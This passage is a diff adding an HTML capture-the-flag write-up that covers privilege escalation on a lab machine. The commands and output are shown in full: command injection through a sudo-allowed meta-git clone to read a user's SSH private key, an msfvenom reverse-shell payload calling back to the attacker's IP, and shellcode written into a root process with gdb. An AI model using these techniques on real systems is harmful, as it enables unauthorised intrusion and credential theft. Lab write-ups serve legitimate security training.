+    <span class="p">(</span><span class="nx">developer</span><span class="p">)</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">meta</span><span class="o">-</span><span class="nx">git</span>
+</code></pre></div></div>
+
+<p>Searching for information about command injection with this file it seems like we can inject command using the clone feature. I haven’t been able to find a suitable payload so I try common injections bypassses, more over we can see exactly where is the command injected.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">chdir</span> <span class="dl">'</span><span class="s1">/home/gbyolo/test/sss;ping -c 1 10.10.14.16</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>To trigger the injection we can use the following payload.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gbyolo</span><span class="p">@</span><span class="nd">faculty</span><span class="p">:</span><span class="o">/</span><span class="nx">tmp$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">developer</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">meta</span><span class="o">-</span><span class="nx">git</span> <span class="nx">clone</span> <span class="dl">'</span><span class="s1">sss||touch ./dev</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>We create a file as the user developer so we have command execution. Now we need a shell as this user. We try to dump his ssh key.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">gbyolo</span><span class="p">@</span><span class="nd">faculty</span><span class="p">:</span><span class="o">/</span><span class="nx">tmp$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">developer</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">meta</span><span class="o">-</span><span class="nx">git</span> <span class="nx">clone</span> <span class="dl">'</span><span class="s1">sss||cat /home/developer/.ssh/id_rsa</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>And we get it, now we can connect to the machine as the user developer.</p>
+
+<h3 id="getting-root">Getting root</h3>
+
+<p>This new user must have any new privilege to escalate that the previous did not. If we check out groups we will see that we are in two strange groups</p>
+
+<ul>
+  <li>faculty</li>
+  <li>debug</li>
+</ul>
+
+<p>If we find file that are owned by this groups we will see that only the members of group debug are able to execute gdb.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">developer</span><span class="p">@</span><span class="nd">faculty</span><span class="p">:</span><span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">scheduling</span><span class="o">/</span><span class="nx">admin$</span> <span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">group</span> <span class="dl">"</span><span class="s2">debug</span><span class="dl">"</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/</span><span class="kc">null</span>
+<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">gdb</span>
+</code></pre></div></div>
+
+<p>The binary is not SUID so maybe it has special capabilities.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">developer</span><span class="p">@</span><span class="nd">faculty</span><span class="p">:</span><span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">scheduling</span><span class="o">/</span><span class="nx">admin$</span> <span class="nx">getcap</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">gdb</span>
+<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">gdb</span> <span class="o">=</span> <span class="nx">cap_sys_ptrace</span><span class="o">+</span><span class="nx">ep</span>
+</code></pre></div></div>
+
+<p>It has <code class="language-plaintext highlighter-rouge">cap_sys_ptrace</code> capability that can be used to attach to any running program.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="sr">/machines/</span><span class="nx">linux</span><span class="o">/</span><span class="nx">faculty</span><span class="p">]</span>
+<span class="err">└─</span><span class="nx">$</span> <span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">linux</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">14.16</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">443</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">py</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">revshell</span><span class="p">.</span><span class="nx">py</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">platform</span> <span class="nx">was</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">choosing</span> <span class="nx">Msf</span><span class="p">::</span><span class="nx">Module</span><span class="p">::</span><span class="nx">Platform</span><span class="p">::</span><span class="nx">Linux</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">arch</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">selecting</span> <span class="nx">arch</span><span class="p">:</span> <span class="nx">x64</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
+<span class="nx">No</span> <span class="nx">encoder</span> <span class="nx">specified</span><span class="p">,</span> <span class="nx">outputting</span> <span class="nx">raw</span> <span class="nx">payload</span>
+<span class="nx">Payload</span> <span class="nx">size</span><span class="p">:</span> <span class="mi">74</span> <span class="nx">bytes</span>
+<span class="nx">Final</span> <span class="nx">size</span> <span class="k">of</span> <span class="nx">py</span> <span class="nx">file</span><span class="p">:</span> <span class="mi">384</span> <span class="nx">bytes</span>
+<span class="nx">Saved</span> <span class="k">as</span><span class="p">:</span> <span class="nx">revshell</span><span class="p">.</span><span class="nx">py</span>
+                                                                                                                                                                                                                                            
+<span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="sr">/machines/</span><span class="nx">linux</span><span class="o">/</span><span class="nx">faculty</span><span class="p">]</span>
+<span class="err">└─</span><span class="nx">$</span> <span class="nx">cat</span> <span class="nx">revshell</span><span class="p">.</span><span class="nx">py</span>           
+<span class="nx">buf</span> <span class="o">=</span>  <span class="nx">b</span><span class="dl">""</span>
+<span class="nx">buf</span> <span class="o">+=</span> <span class="nx">b</span><span class="dl">"</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x29</span><span class="se">\</span><span class="s2">x58</span><span class="se">\</span><span class="s2">x99</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x02</span><span class="se">\</span><span class="s2">x5f</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x01</span><span class="se">\</span><span class="s2">x5e</span><span class="se">\</span><span class="s2">x0f</span><span class="se">\</span><span class="s2">x05</span><span class="dl">"</span>
+<span class="nx">buf</span> <span class="o">+=</span> <span class="nx">b</span><span class="dl">"</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x97</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">xb9</span><span class="se">\</span><span class="s2">x02</span><span class="se">\</span><span class="s2">x00</span><span class="se">\</span><span class="s2">x01</span><span class="se">\</span><span class="s2">xbb</span><span class="se">\</span><span class="s2">x0a</span><span class="se">\</span><span class="s2">x0a</span><span class="se">\</span><span class="s2">x0e</span><span class="se">\</span><span class="s2">x10</span><span class="dl">"</span>
+<span class="nx">buf</span> <span class="o">+=</span> <span class="nx">b</span><span class="dl">"</span><span class="se">\</span><span class="s2">x51</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x89</span><span class="se">\</span><span class="s2">xe6</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x10</span><span class="se">\</span><span class="s2">x5a</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x2a</span><span class="se">\</span><span class="s2">x58</span><span class="se">\</span><span class="s2">x0f</span><span class="se">\</span><span class="s2">x05</span><span class="dl">"</span>
+<span class="nx">buf</span> <span class="o">+=</span> <span class="nx">b</span><span class="dl">"</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x03</span><span class="se">\</span><span class="s2">x5e</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">xff</span><span class="se">\</span><span class="s2">xce</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x21</span><span class="se">\</span><span class="s2">x58</span><span class="se">\</span><span class="s2">x0f</span><span class="se">\</span><span class="s2">x05</span><span class="se">\</span><span class="s2">x75</span><span class="dl">"</span>
+<span class="nx">buf</span> <span class="o">+=</span> <span class="nx">b</span><span class="dl">"</span><span class="se">\</span><span class="s2">xf6</span><span class="se">\</span><span class="s2">x6a</span><span class="se">\</span><span class="s2">x3b</span><span class="se">\</span><span class="s2">x58</span><span class="se">\</span><span class="s2">x99</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">xbb</span><span class="se">\</span><span class="s2">x2f</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6e</span><span class="se">\</span><span class="s2">x2f</span><span class="dl">"</span>
+<span class="nx">buf</span> <span class="o">+=</span> <span class="nx">b</span><span class="dl">"</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x00</span><span class="se">\</span><span class="s2">x53</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x89</span><span class="se">\</span><span class="s2">xe7</span><span class="se">\</span><span class="s2">x52</span><span class="se">\</span><span class="s2">x57</span><span class="se">\</span><span class="s2">x48</span><span class="se">\</span><span class="s2">x89</span><span class="se">\</span><span class="s2">xe6</span><span class="dl">"</span>
+<span class="nx">buf</span> <span class="o">+=</span> <span class="nx">b</span><span class="dl">"</span><span class="se">\</span><span class="s2">x0f</span><span class="se">\</span><span class="s2">x05</span><span class="dl">"</span>
+</code></pre></div></div>
+
+<p>We use a script from hacktricks <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace</a> to generate the payload in the correct format to use it in gdb.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="sr">/machines/</span><span class="nx">linux</span><span class="o">/</span><span class="nx">faculty</span><span class="p">]</span>
+<span class="err">└─</span><span class="nx">$</span> <span class="nx">python</span> <span class="nx">revshell</span><span class="p">.</span><span class="nx">py</span>       
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x296a909090909090</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x5e016a5f026a9958</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x0002b9489748050f</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">24</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x4851100e0a0abb01</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x582a6a5a106ae689</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">40</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xceff485e036a050f</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x6af675050f58216a</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">56</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x69622fbb4899583b</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">64</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x8948530068732f6e</span>
+<span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">72</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x050fe689485752e7</span>
+</code></pre></div></div>
+
+<p>Now we have to select a process running as root and debug it with GDB. We can choose any until one works. In this box we can use it with a sleep that root executes in time intervals or with the postfix process.</p>
+
+<ul>
+  <li>postfix</li>
+</ul>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">developer</span><span class="p">@</span><span class="nd">faculty</span><span class="p">:</span><span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">scheduling</span><span class="o">/</span><span class="nx">admin$</span> <span class="nx">gdb</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">1561</span>
+<span class="nx">GNU</span> <span class="nf">gdb </span><span class="p">(</span><span class="nx">Ubuntu</span> <span class="mf">9.2</span><span class="o">-</span><span class="mi">0</span><span class="nx">ubuntu1</span><span class="o">~</span><span class="mf">20.04</span><span class="p">.</span><span class="mi">1</span><span class="p">)</span> <span class="mf">9.2</span>
+<span class="nc">Copyright </span><span class="p">(</span><span class="nx">C</span><span class="p">)</span> <span class="mi">2020</span> <span class="nx">Free</span> <span class="nx">Software</span> <span class="nx">Foundation</span><span class="p">,</span> <span class="nx">Inc</span><span class="p">.</span>                                                                                                                                                                                           
+<span class="nx">License</span> <span class="nx">GPLv3</span><span class="o">+</span><span class="p">:</span> <span class="nx">GNU</span> <span class="nx">GPL</span> <span class="nx">version</span> <span class="mi">3</span> <span class="nx">or</span> <span class="nx">later</span> <span class="o">&lt;</span><span class="nx">http</span><span class="p">:</span><span class="c1">//gnu.org/licenses/gpl.html&gt;</span>
+<span class="nx">This</span> <span class="nx">is</span> <span class="nx">free</span> <span class="nx">software</span><span class="p">:</span> <span class="nx">you</span> <span class="nx">are</span> <span class="nx">free</span> <span class="nx">to</span> <span class="nx">change</span> <span class="nx">and</span> <span class="nx">redistribute</span> <span class="nx">it</span><span class="p">.</span>
+<span class="nx">There</span> <span class="nx">is</span> <span class="nx">NO</span> <span class="nx">WARRANTY</span><span class="p">,</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">extent</span> <span class="nx">permitted</span> <span class="nx">by</span> <span class="nx">law</span><span class="p">.</span>
+<span class="nx">Type</span> <span class="dl">"</span><span class="s2">show copying</span><span class="dl">"</span> <span class="nx">and</span> <span class="dl">"</span><span class="s2">show warranty</span><span class="dl">"</span> <span class="k">for</span> <span class="nx">details</span><span class="p">.</span>
+<span class="nx">This</span> <span class="nx">GDB</span> <span class="nx">was</span> <span class="nx">configured</span> <span class="k">as</span> <span class="dl">"</span><span class="s2">x86_64-linux-gnu</span><span class="dl">"</span><span class="p">.</span>
+<span class="nx">Type</span> <span class="dl">"</span><span class="s2">show configuration</span><span class="dl">"</span> <span class="k">for</span> <span class="nx">configuration</span> <span class="nx">details</span><span class="p">.</span>
+<span class="nx">For</span> <span class="nx">bug</span> <span class="nx">reporting</span> <span class="nx">instructions</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">see</span><span class="p">:</span>
+<span class="o">&lt;</span><span class="nx">http</span><span class="p">:</span><span class="c1">//www.gnu.org/software/gdb/bugs/&gt;.</span>
+<span class="nx">Find</span> <span class="nx">the</span> <span class="nx">GDB</span> <span class="nx">manual</span> <span class="nx">and</span> <span class="nx">other</span> <span class="nx">documentation</span> <span class="nx">resources</span> <span class="nx">online</span> <span class="nx">at</span><span class="p">:</span>
+    <span class="o">&lt;</span><span class="nx">http</span><span class="p">:</span><span class="c1">//www.gnu.org/software/gdb/documentation/&gt;.</span>
+
+<span class="nx">For</span> <span class="nx">help</span><span class="p">,</span> <span class="nx">type</span> <span class="dl">"</span><span class="s2">help</span><span class="dl">"</span><span class="p">.</span>
+<span class="nx">Type</span> <span class="dl">"</span><span class="s2">apropos word</span><span class="dl">"</span> <span class="nx">to</span> <span class="nx">search</span> <span class="k">for</span> <span class="nx">commands</span> <span class="nx">related</span> <span class="nx">to</span> <span class="dl">"</span><span class="s2">word</span><span class="dl">"</span><span class="p">.</span>
+<span class="nx">Attaching</span> <span class="nx">to</span> <span class="nx">process</span> <span class="mi">1561</span>
+<span class="nx">Reading</span> <span class="nx">symbols</span> <span class="k">from</span> <span class="sr">/usr/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">postfix</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">master</span><span class="p">...</span>
+<span class="p">(</span><span class="nx">No</span> <span class="nx">debugging</span> <span class="nx">symbols</span> <span class="nx">found</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">postfix</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">master</span><span class="p">)</span>
+<span class="nx">Reading</span> <span class="nx">symbols</span> <span class="k">from</span> <span class="sr">/lib64/</span><span class="nx">ld</span><span class="o">-</span><span class="nx">linux</span><span class="o">-</span><span class="nx">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="nx">so</span><span class="p">.</span><span class="mi">2</span><span class="p">...</span>
+<span class="nx">Reading</span> <span class="nx">symbols</span> <span class="k">from</span> <span class="sr">/usr/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">debug</span><span class="o">/</span><span class="p">.</span><span class="nx">build</span><span class="o">-</span><span class="nx">id</span><span class="o">/</span><span class="mi">45</span><span class="o">/</span><span class="mi">87364908</span><span class="nx">de169dec62ffa538170118c1c3a078</span><span class="p">.</span><span class="nx">debug</span><span class="p">...</span>
+<span class="mh">0x00007f5cfc90042a</span> <span class="k">in</span> <span class="nf">_start </span><span class="p">()</span> <span class="k">from</span> <span class="sr">/lib64/</span><span class="nx">ld</span><span class="o">-</span><span class="nx">linux</span><span class="o">-</span><span class="nx">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="nx">so</span><span class="p">.</span><span class="mi">2</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x296a909090909090</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x5e016a5f026a9958</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x0002b9489748050f</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">24</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x4851100e0a0abb01</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x582a6a5a106ae689</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">40</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xceff485e036a050f</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">48</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x6af675050f58216a</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">56</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x69622fbb4899583b</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">64</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x8948530068732f6e</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="kd">set</span> <span class="p">{</span><span class="nx">long</span><span class="p">}(</span><span class="nx">$rip</span><span class="o">+</span><span class="mi">72</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x050fe689485752e7</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">c</span>
+<span class="nx">Continuing</span><span class="p">.</span>
+<span class="nx">process</span> <span class="mi">1561</span> <span class="nx">is</span> <span class="nx">executing</span> <span class="k">new</span> <span class="nx">program</span><span class="p">:</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">dash</span>
+<span class="nx">warning</span><span class="p">:</span> <span class="nx">Probes</span><span class="o">-</span><span class="nx">based</span> <span class="nx">dynamic</span> <span class="nx">linker</span> <span class="kr">interface</span> <span class="nx">failed</span><span class="p">.</span>
+<span class="nx">Reverting</span> <span class="nx">to</span> <span class="nx">original</span> <span class="kr">interface</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>Once we continue with the execution we will have a reverse shell in our listener.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+<span class="err">└─</span><span class="nx">$</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvnp</span> <span class="mi">443</span>
+<span class="nx">listening</span> <span class="nx">on</span> <span class="p">[</span><span class="nx">any</span><span class="p">]</span> <span class="mi">443</span> <span class="p">...</span>
+<span class="nx">connect</span> <span class="nx">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">14.16</span><span class="p">]</span> <span class="k">from </span><span class="p">(</span><span class="nx">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.169</span><span class="p">]</span> <span class="mi">53690</span>
+<span class="nx">whoami</span>
+<span class="nx">root</span>
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
